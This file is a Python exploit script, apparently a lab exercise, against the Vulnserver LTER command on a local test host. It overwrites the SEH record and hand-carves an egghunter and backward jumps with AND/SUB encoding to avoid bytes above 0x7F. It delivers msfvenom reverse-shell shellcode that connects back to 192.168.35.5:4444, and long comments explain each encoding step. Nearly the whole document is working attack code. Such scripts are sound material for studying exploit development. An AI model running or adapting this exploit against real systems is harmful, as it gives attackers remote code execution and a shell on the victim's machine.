#!/usr/bin/python

import socket
import os
import sys

#    EBP (0x00f1f9d8) points at offset 1999 in normal pattern (length 1576)
#    EDX contains normal pattern : 0x32704531 (offset 3575)
#    ECX (0x003d5594) points at offset 3579 in normal pattern (length 508)
#    SEH record (nseh field) at 0x00f1ffc4 overwritten with normal pattern : 0x326e4531 (offset 3515), followed by 52 bytes of cyclic data after the handler
#    0x00f1f20c : Contains normal cyclic pattern at ESP+0x24 (+36) : offset 3, length 3572 (-> 0x00f1ffff : ESP+0xe18)
#    0x00f1f108 : Pointer into normal cyclic pattern at ESP-0xe0 (-224) : 0x00f1fc88 : offset 2687, length 888
#    0x00f1f120 : Pointer into normal cyclic pattern at ESP-0xc8 (-200) : 0x00f1fc88 : offset 2687, length 888
#    0x00f1f140 : Pointer into normal cyclic pattern at ESP-0xa8 (-168) : 0x00f1f790 : offset 1415, length 2160
#    0x00f1f148 : Pointer into normal cyclic pattern at ESP-0xa0 (-160) : 0x00f1fc68 : offset 2655, length 920

# 0x625010B4 pop; pop; ret in essfunc.dll
#seh = "\xB4\x10\x50\x62" # gets corrupted and results in 62501035 instead of 625010b4; reason: everything higher than 7F has 7F subtracted from it -> B4 - 7F = 35 -> find address without byte > 7F -> 0x6250172B in essfunc.dll
seh = "\x2B\x17\x50\x62"
nseh = "\x42\x75\x06\x90" # inc edx to unset zero flag; then jne 0x08: jmp short 8 bytes over nseh and seh

# instructions to encode manually since they contain bytes > 7F:
#egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # !mona egg, egg is w00t
#far_neg_jmp = "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1" # jmps approx. 512 bytes back
#short_neg_jmp = "\xEB\x80" # space here is not enough (after nseh and seh), so jump back 128 bytes again


# =============================
# manual encoding of short_neg_jmp
# 4 byte chunk
# \x90\x90\xEB\x80

# 9090eb80 -> reverse -> 80eb9090
# (0) - 80eb9090 = 7f146f70
# A   B   C   D
# 70  64  0A  02
# 6f  64  0A  01
# 14  0A  09  01
# 7f  64  14  07

# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,640A6464
# SUB EAX,14090A0A
# SUB EAX,07010102
# PUSH EAX

short_neg_jmp_carved = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x64\x64\x0A\x64\x2D\x0A\x0A\x09\x14\x2D\x02\x01\x01\x07\x50" # 26 bytes

# =============================


# =============================
# manual encoding of far_neg_jmp (NOT USED)
# AND EAX,554E4D4A
# AND EAX,2A313235

# 4 byte chunks
# \xFE\xCD\xFF\xE1
# \x0A\x90\xFE\xCD
# \xF4\x59\x80\xC1
# \xEE\xD9\x74\x24
# \x90\x90\x90\xD9 # fill up with nops

# fecdffe1 -> reverse -> e1ffcdfe
# (0) - e1ffcdfe = 1E003202
# A   B   C   D
# 02  5E  50  54     (can not be reduced in three steps to 00 -> calc 102 - 5e - 50 - 54 = 0)
# 32  19  17  01     (results in 0x01, but now the extra 1 from above needs to be subtracted -> 0)
# 00  5E  50  52
# 1E  0F  0D  01     (also results in 0x01, but extra 1 from above -> 0)

# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,0F5E195E
# SUB EAX,0D501750
# SUB EAX,01520154
# PUSH EAX

# 0a90fecd -> reverse -> cdfe900a
# (0) - cdfe900a = 32016ff6
# A   B   C   D
# f6  64  64  2E
# 6f  64  0A  01
# 01  5E  50  53   (0x101)
# 32  19  17  01   (=0x1 - 0x1 from above = 0x00)

# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,195E6464
# SUB EAX,17500A64
# SUB EAX,0153012E
# PUSH EAX

# f45980c1 -> reverse -> c18059f4
# (0) - c18059f4 = 3E7FA60C
# A   B   C   D
# 0C  0A  01  01
# A6  64  3C  06
# 7F  64  14  07
# 3E  32  0A  02

# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,3264640A
# SUB EAX,0A143C01
# SUB EAX,02070601
# PUSH EAX

# EED97424 -> reverse -> 2474D9EE
# (0) - 2474D9EE = DB8B2612
# A   B   C   D
# 12  0A  07  01
# 26  14  11  01
# 8B  64  1E  09
# DB  64  64  13

# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,6464140A
# SUB EAX,641E1107
# SUB EAX,13090101
# PUSH EAX

# 909090D9 -> reverse -> D9909090
# (0) - D9909090 = 266F6F70
# A   B   C   D
# 70  64  0A  02
# 6F  64  0A  01
# 6F  64  0A  01
# 26  1E  07  01

# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,1E646464
# SUB EAX,070A0A0A
# SUB EAX,01010102
# PUSH EAX

far_neg_jmp_carved = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x5E\x19\x5E\x0F\x2D\x50\x17\x50\x0D\x2D\x54\x01\x52\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x64\x64\x5E\x19\x2D\x64\x0A\x50\x17\x2D\x2E\x01\x53\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x0A\x64\x64\x32\x2D\x01\x3C\x14\x0A\x2D\x01\x06\x07\x02\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x0A\x14\x64\x64\x2D\x07\x11\x1E\x64\x2D\x01\x01\x09\x13\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x64\x64\x64\x1E\x2D\x0A\x0A\x0A\x07\x2D\x02\x01\x01\x01\x50" # 130 bytes

# ==============================


# ==============================
# manual encoding of egghunter
# since there are restricted characters (everything > 7F) I decided to manually encode the egghunter
# step 1: zero out register
# AND EAX,554E4D4A
# AND EAX,2A313235
#
# step 2: break down shellcode into 4 byte chunks, starting from the end
# \x75\xe7\xff\xe7
# \xaf\x75\xea\xaf
# \x30\x74\x8b\xfa
# \xef\xb8\x77\x30
# \x3c\x05\x5a\x74
# \x02\x58\xcd\x2e
# \x0f\x42\x52\x6a
# \x66\x81\xca\xff
#
# step 3: start with the first chunk \x75\xe7\xff\xe7 and reverse the order of the bytes to get \xe7\xff\xe7\x75
# calculate eax (0) - e7ffe775 = 1800188b
# create a table with four columns and put values from 1800188b starting at the bottom of column A:
# A   B   C   D 
# 8b
# 18
# 00
# 18
# now start at 8b and subtract three values to get a 00 (remember that every value must be less than 7F!)
# A   B   C   D
# 8b  64  26  01     (0x8b = 139, -0x64 (-100) = 39, -0x26 (-38) = 01, -0x01 (-01) = 00
# 18  0C  0B  01
# 00  5E  50  52     (change 00 to 100 and then: 100-5E-50-52=0, attention the appended 1 to 00 needs to be taken in account in the next line)
# 18  0C  0A  01     (0x18 - 0xC - 0xA - 0x1 = 0x1 -> but with -1 from previous calculation it results in 00) (NOTE: if this happens in bottom row simply ignore the extra 1)
#
# now start in column B from bottom up: 0C5E0C64, column C: 0A500B26, column D: 01520101
# results in the following three SUB instructions:
# SUB EAX, 0C5E0C64
# SUB EAX, 0A500B26
# SUB EAX, 01520101
#
# resulting first shellcode carving instructions:
# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,0C5E0C64
# SUB EAX,0A500B26
# SUB EAX,01520101
# PUSH EAX
#
# ------------------
#
# af75eaaf -> reverse -> afea75af
# (0) - afea75af = 50158a51
# A   B   C   D
# 51  1F  31  01
# 8a  64  25  01
# 15  0A  0A  01
# 50  1E  31  01
#
# SUB EAX, 1E0A641F
# SUB EAX, 310A2531
# SUB EAX, 01010101
#
# second instructions:
# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,1E0A641F
# SUB EAX,310A2531
# SUB EAX,01010101
# PUSH EAX
#
# ------------------
#
# 30748bfa -> reverse -> fa8b7430
# (0) - fa8b7430 = 05748bd0
# A   B   C   D
# d0  64  64  08
# 8b  64  26  01
# 74  64  0F  01
# 05  02  02  01
#
# third instructions:
# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,02646464
# SUB EAX,020F2664
# SUB EAX,01010108
# PUSH EAX
#
# ------------------
#
# efb87730 -> reverse -> 3077b8ef
# (0) - 3077b8ef = cf884711
# A   B   C   D
# 11  0A  06  01
# 47  15  31  01
# 88  64  23  01
# cf  64  64  07
#
# fourth instructions:
# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,6464150A
# SUB EAX,64233106
# SUB EAX,07010101
# PUSH EAX
#
# ------------------
#
# 3c055a74 -> reverse -> 745a053c
# (0) - 745a053c = 8ba5fac4
# A   B   C   D
# c4  64  5F  01
# fa  64  64  32
# a5  64  40  01
# 8b  64  26  01
#
# fifth instructions:
# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,64646464
# SUB EAX,2640645F
# SUB EAX,01013201
# PUSH EAX
#
# -----------------
# 
# 0258cd2e -> reverse -> 2ecd5802
# (0) - 2ecd5802 = d132a7fe
# A   B   C   D
# fe  64  64  36
# a7  64  42  01
# 32  28  09  01
# d1  64  64  09
#
# sixth instructions:
# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,64286464
# SUB EAX,64094264
# SUB EAX,09010136
# PUSH EAX
#
# -----------------
#
# 0f42526a -> reverse -> 6a52420f
# (0) - 6a52420f = 95adbdf1
# A   B   C   D
# f1  64  64  29
# bd  64  58  01
# ad  64  48  01
# 95  64  30  01
# 
# seventh instructions:
# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,64646464
# SUB EAX,30485864
# SUB EAX,01010129
# PUSH EAX
#
# ----------------
#
# 6681caff -> reverse -> ffca8166
# (0) - ffca8166 = 00357e9a
# A   B   C   D
# 9a  64  35  01
# 7e  64  19  01
# 35  17  1D  01
# 00  5E  50  52
#
# eigth instructions:
# AND EAX,554E4D4A
# AND EAX,2A313235
# SUB EAX,5E176464
# SUB EAX,501D1935
# SUB EAX,52010101
# PUSH EAX

egghunter_carved = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x64\x0C\x5E\x0C\x2D\x26\x0B\x50\x0A\x2D\x01\x01\x52\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x1F\x64\x0A\x1E\x2D\x31\x25\x0A\x31\x2D\x01\x01\x01\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x64\x64\x64\x02\x2D\x64\x26\x0F\x02\x2D\x08\x01\x01\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x0A\x15\x64\x64\x2D\x06\x31\x23\x64\x2D\x01\x01\x01\x07\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x64\x64\x64\x64\x2D\x5F\x64\x40\x26\x2D\x01\x32\x01\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x64\x64\x28\x64\x2D\x64\x42\x09\x64\x2D\x36\x01\x01\x09\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x64\x64\x64\x64\x2D\x64\x58\x48\x30\x2D\x29\x01\x01\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x64\x64\x17\x5E\x2D\x35\x19\x1D\x50\x2D\x01\x01\x01\x52\x50" # 208 bytes
# ==================================

# =================================
# stack alignment 1
# PUSH ESP
# POP EAX
# ADD AX,1151
# ADD AL,7F
# PUSH EAX
# POP ESP
stack_alignment_1 = "\x54\x58\x66\x05\x51\x11\x04\x7F\x50\x5C" # adjust stack (esp is af 00dfee24 and instructions should appear at 00dffff4 (address must be divisible by 4!) => difference is 00dffff4-00dfee24=11D0: push esp;pop eax;add ax,11cf;push eax;pop esp => results in \x54\x58\x66\x05\xD0\x11\x50\x5C which has D0 > 7F => split up to two add instructions: add ax,1151;add al,7F
# ================================

# =================================
# stack alignment 2 after short_neg_jmp_carved
# esp is 00f2fff0, align to 00f2ffc4 (attention: source is greater than destination! calculation (0xffffffff+1)-(dest-source) (usually it is source - dest)
# python: hex((0xffffffff+1)-(0x00f2ffc4-0x00f2fff0)) = 0x10000002c
# A   B   C   D
# 2c  28  02  02
# 00  5E  50  52
# 00  5E  50  51
# 00  5E  50  51 (attention: 51 due to the remaining one from above!)

# PUSH ESP
# POP EAX
# SUB EAX,5E5E5E28
# SUB EAX,50505002
# SUB EAX,51515202
# PUSH EAX
# POP ESP

stack_alignment_2 = "\x54\x58\x2D\x28\x5E\x5E\x5E\x2D\x02\x50\x50\x50\x2D\x02\x52\x51\x51\x50\x5C"
# =================================

# =================================
# long jump backwards (3000 bytes)
long_jmp_carved = "\x25\x04\x04\x04\x04\x25\x10\x20\x20\x30\x2d\x01\x6f\x6f\x6f\x50\x25\x04\x04\x04\x04\x25\x10\x20\x20\x30\x2d\x7d\x54\x54\x74\x2d\x7c\x54\x74\x74\x2d\x1e\x13\x43\x17\x50"
# ================================

# ================================
# stack alignment 3 after long_jmp_carved
# esp is at 00f0ffbc, align to 00f0fe5c
# python: hex((0xffffffff+1)-(0x00f0fe5c-0x00f0ffbc))=0x100000160
# A   B   C   D
# 60  5A  05  01
# 01  64  64  39  (can not be reduced to 00 in three steps => 101)
# 00  5E  50  51
# 00  5E  50  51

# PUSH ESP
# POP EAX
# SUB EAX,5E5E645A
# SUB EAX,50506405
# SUB EAX,51513901
# PUSH EAX
# POP ESP

stack_alignment_3 = "\x54\x58\x2D\x5A\x64\x5E\x5E\x2D\x05\x64\x50\x50\x2D\x01\x39\x51\x51\x50\x5C"
# ================================

# msfvenom shell_reverse_tcp LHOST=192.168.35.5 LPORT=4444 -b "\x00" -f python
# size: 351 bytes
shellcode =  b""
shellcode += b"\xb8\xc5\x35\xa6\x36\xda\xd9\xd9\x74\x24\xf4\x5d\x31"
shellcode += b"\xc9\xb1\x52\x31\x45\x12\x03\x45\x12\x83\x28\xc9\x44"
shellcode += b"\xc3\x4e\xda\x0b\x2c\xae\x1b\x6c\xa4\x4b\x2a\xac\xd2"
shellcode += b"\x18\x1d\x1c\x90\x4c\x92\xd7\xf4\x64\x21\x95\xd0\x8b"
shellcode += b"\x82\x10\x07\xa2\x13\x08\x7b\xa5\x97\x53\xa8\x05\xa9"
shellcode += b"\x9b\xbd\x44\xee\xc6\x4c\x14\xa7\x8d\xe3\x88\xcc\xd8"
shellcode += b"\x3f\x23\x9e\xcd\x47\xd0\x57\xef\x66\x47\xe3\xb6\xa8"
shellcode += b"\x66\x20\xc3\xe0\x70\x25\xee\xbb\x0b\x9d\x84\x3d\xdd"
shellcode += b"\xef\x65\x91\x20\xc0\x97\xeb\x65\xe7\x47\x9e\x9f\x1b"
shellcode += b"\xf5\x99\x64\x61\x21\x2f\x7e\xc1\xa2\x97\x5a\xf3\x67"
shellcode += b"\x41\x29\xff\xcc\x05\x75\x1c\xd2\xca\x0e\x18\x5f\xed"
shellcode += b"\xc0\xa8\x1b\xca\xc4\xf1\xf8\x73\x5d\x5c\xae\x8c\xbd"
shellcode += b"\x3f\x0f\x29\xb6\xd2\x44\x40\x95\xba\xa9\x69\x25\x3b"
shellcode += b"\xa6\xfa\x56\x09\x69\x51\xf0\x21\xe2\x7f\x07\x45\xd9"
shellcode += b"\x38\x97\xb8\xe2\x38\xbe\x7e\xb6\x68\xa8\x57\xb7\xe2"
shellcode += b"\x28\x57\x62\xa4\x78\xf7\xdd\x05\x28\xb7\x8d\xed\x22"
shellcode += b"\x38\xf1\x0e\x4d\x92\x9a\xa5\xb4\x75\x65\x91\x95\x80"
shellcode += b"\x0d\xe0\xd9\x9b\x91\x6d\x3f\xf1\x39\x38\xe8\x6e\xa3"
shellcode += b"\x61\x62\x0e\x2c\xbc\x0f\x10\xa6\x33\xf0\xdf\x4f\x39"
shellcode += b"\xe2\x88\xbf\x74\x58\x1e\xbf\xa2\xf4\xfc\x52\x29\x04"
shellcode += b"\x8a\x4e\xe6\x53\xdb\xa1\xff\x31\xf1\x98\xa9\x27\x08"
shellcode += b"\x7c\x91\xe3\xd7\xbd\x1c\xea\x9a\xfa\x3a\xfc\x62\x02"
shellcode += b"\x07\xa8\x3a\x55\xd1\x06\xfd\x0f\x93\xf0\x57\xe3\x7d"
shellcode += b"\x94\x2e\xcf\xbd\xe2\x2e\x1a\x48\x0a\x9e\xf3\x0d\x35"
shellcode += b"\x2f\x94\x99\x4e\x4d\x04\x65\x85\xd5\x34\x2c\x87\x7c"
shellcode += b"\xdd\xe9\x52\x3d\x80\x09\x89\x02\xbd\x89\x3b\xfb\x3a"
shellcode += b"\x91\x4e\xfe\x07\x15\xa3\x72\x17\xf0\xc3\x21\x18\xd1"

# send egg plus shellcode via another command:
buf = "GDOG " + "w00tw00t" + shellcode + "\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.35.6", 9999))
expl.recv(1024)
expl.send(buf)
expl.close()


crash = "A"*500
crash += "\x47"*20 # some "nops" in front of stack alignment and egghunter
crash += stack_alignment_3
crash += egghunter_carved
crash += "C"*(3435-len(crash))
# until here 3435 bytes!
crash += "\x47"*3 # "nops"; short_neg_jmp_carved lands here
crash += stack_alignment_2
crash += long_jmp_carved
crash += "\x47"*(3515-len(crash)) # fill up to 3515 bytes with "nops"
crash += nseh
crash += seh
#crash += "\x90"*3 # few nops in front of short_neg_jmp_carved => 0x90 is greater than 0x7F, so it gets converted to 0x90-0x7F=0x11 => simply use inc edi since that does no harm here
crash += "\x47" # inc edi instead of nops
crash += stack_alignment_1 # align stack before carving short_neg_jmp
crash += short_neg_jmp_carved # after this jump is taken eip points to 00FAFF7F (inside the first part of the payload (3515 nops))
crash += "\x47"*(5000-len(crash)) # inc edi instead of nops (<=7F)

buf = "LTER /.:/" + crash + "\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.35.6", 9999))
expl.recv(1024) # read welcome message
expl.send(buf)
expl.close()
